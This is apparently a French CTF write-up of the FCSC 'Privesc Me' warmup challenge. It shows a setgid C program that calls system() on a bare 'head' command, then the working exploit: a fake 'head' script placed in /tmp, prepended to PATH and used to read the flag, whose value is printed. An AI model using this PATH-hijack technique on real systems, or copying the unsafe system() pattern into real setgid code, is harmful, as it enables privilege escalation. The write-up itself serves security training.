# Privesc Me (1) - Warmup - 25 pts

> Un challenge d'échauffement vous attend dans le dossier `stage0`. À vous de trouver un moyen d'augmenter vos privilèges. 
>
> `ssh -p7005 challenger@challenges1.france-cybersecurity-challenge.fr` (mot de passe : `challenger`.) 
>
> *Note : cet environnement est partagé entre les 4 challenges `Privesc Me`. Le dossier /tmp est nettoyé fréquemment.*

On se connecte en SSH comme demandé et un gros message en rouge nous accueille :

```
*****************************************************************************************************
*****************************************************************************************************
You can create yourself a random directory inside /tmp directory to start creating scripts if needed.
*****************************************************************************************************
*****************************************************************************************************

challenger@privescme:~$ 
```

```
challenger@privescme:~$ ls
stage0  stage1  stage2  stage3
challenger@privescme:~$ cd stage0
challenger@privescme:~/stage0$ ls -l
total 28
-r--r----- 1 root stage0_privileged    70 Apr 25 20:12 flag.txt
-r-xr-sr-x 1 root stage0_privileged 16792 Apr 25 20:14 stage0
-r--r--r-- 1 root stage0_privileged   223 Apr 25 20:12 stage0.c
```

Le binaire `stage0` a un bit *setgid* ce qui signifie que nous l'exécutons comme si nous étions le groupe propriétaire c'est-à-dire `stage0_privileged`, ça tombe bien car contrairement à nous, il a le droit le lire `flag.txt` !

On suppose que `stage0.c` est le code source du binaire :

```c
challenger@privescme:~/stage0$ cat stage0.c 
#define _GNU_SOURCE 
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char const *argv[]) {
    setresgid(getegid(), getegid(), getegid());
    system("head -c5 flag.txt");
    return 0;
}
```

Et si on lance le binaire :

```
challenger@privescme:~/stage0$ ./stage0 
FCSC{challenger@privescme:~/stage0$ 
```

Cela exécute la commande `head -c5 flag.txt` qui affiche les 5 premiers caractères du fichier. Pour information, quand on exécute une commande Linux, le shell va regarder dans tous les dossiers contenus dans la variables `PATH` à la recherche d'un fichier exécutable du nom de la commande. On a le droit de créer un dossier dans `/tmp.` alors créons un fichier `head` exécutable et ajoutons le dossier à notre `PATH` !

```
challenger@privescme:~/stage0$ mkdir /tmp/ribt
challenger@privescme:~/stage0$ cat > /tmp/ribt/head
#!/bin/bash
cat flag.txt
challenger@privescme:~/stage0$ chmod +x /tmp/ribt/head
challenger@privescme:~/stage0$ PATH=/tmp/ribt:$PATH
challenger@privescme:~/stage0$ ./stage0
FCSC{e5dc17021365baa6719ea48311873d621a3e00fa6f9c41bd2efb4e6c48bf4090}
```

